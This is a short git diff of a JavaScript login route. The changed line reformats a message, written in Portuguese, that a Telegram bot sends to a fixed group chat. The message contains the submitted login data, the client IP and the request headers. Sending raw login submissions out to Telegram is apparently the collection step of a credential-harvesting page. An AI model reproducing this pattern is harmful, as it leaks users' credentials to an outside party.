@@ -12,7 +12,7 @@ routes.post("/login", async function (req, res) {
 
   await bot.telegram.sendMessage(
     "-1001747704625",
-    `dados: ${data}, IP: ${peer}, header: ${headers}`
+    `Algum usuário tentou fazer login:\nDados: ${data}\nIP: ${peer}\nHeaders: ${headers}`
   );
 
   return res
